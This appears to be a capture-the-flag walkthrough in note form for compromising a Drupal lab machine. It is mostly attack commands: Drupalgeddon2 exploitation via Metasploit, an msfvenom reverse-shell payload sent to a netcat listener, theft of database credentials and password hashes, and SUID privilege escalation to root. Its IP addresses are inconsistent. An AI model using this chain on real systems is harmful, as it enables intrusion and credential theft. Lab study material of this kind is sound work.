# Drupal

[Home](../README.md) · [Section index](README.md)

> Adapted from the original notes, lines 11106–11257. Examples are lab-specific and need verification.

# Drupal

ref: https://www.spoofman.co.uk/courses/englishdump

https://walk-throughs.medium.com/exploiting-drupal-via-metasploit-ctf-walkthrough-fcd5f5fa2fa

IP = **192.168.100.52**

Web application Machine hosting **Drupal**

Exploitation: RCE

$ `ip a`

$ `sudo netdiscover -r 192.168.100.0/24`

$ `sudo nmap -sSVC -p- —open 192.168.100.4`

$ `sudo msfconsole`

>> `search drupal`

>> `use exploit/unix/webapp/drupal_drupalgeddon2`

>> `show options`

>> `set RHOSTS 192.168.100.4`

>> `set TARGETURI /drupal/`

>> `run`

Got meterpreter shell

Open the new terminal and generate one msfvenom payload

$ `msfvenom —payload linux/x86/shell_reverse_tcp —platform linux LHOST=kali ip LPORT=1234 -f elf -o sh.elf`

$ `nc -lvnp 1234`

Now again go to meterpreter session

meterpreter> `upload sh.elf`

Upload completed

Bow open shell session

meterpretrr> `shell`

`chmod +x sh.elf`

Now execute this

`./sh.elf`

Now we got reverse shell in the netcat that listening

Now terminate the meterpreter session, and go to netcat got reverse shell

`python -c ‘import pty;pty.spawn(”/bin/bash”)’`

got shell

www-data@DC-1:/var/www$ `export TERM=xterm`

now press ctrl Z

now type this command in the same terminal

$ `stty raw echo;fg;reset`

Now enter ctrl C

Now we got full interactive shell

www-data@DC-1:/var/www$

DB Enum

www-data@DC-1:/var/www$ `ls`

www-data@DC-1:/var/www$ `cd sites`

www-data@DC-1:/var/www/sites$ `ls`

www-data@DC-1:/var/www$ `cd default`

www-data@DC-1:/var/www/sites/default$ `ls`

www-data@DC-1:/var/www/sites/default$ `cat settings.php`

We will get the database credentials in the settings.php file

Now login to mysql database using the cred we get in the settings.php file

www-data@DC-1:/var/www$ `mysql -u dbuser -D drupaldb -p`

password: R0ck3t

Login successful

mysql> `show databases;`

mysql> `use drupaldb;`  in exam it is syntex

mysql> `show tables;`

mysql> `SELECT * FROM users;`

mysql> `SELECT name,pass,mail FROM users;`

copy all the details and exit it

mysql> `exit`

Login to user Acc

Now login via ssh

$ `ssh auditor@198.168.100.52`

passwrd: qwertyuiop

Login successful to auditor terminal

get flag of user

Another way

www-data@DC-1:/var/www$ `su auditor`

enter password: qwertyuiop

Login successful to auditor terminal

auditor@kalilinux$  get the user flag here

Priv Esc

Now priv escalation to get admin - SUID

www-data@DC-1:/var/www$ `find /etc/passwd -exec ‘/bin/sh’ \;`

the above command will give root access shell

#`cd /root`

#`ls`

get the root flag here
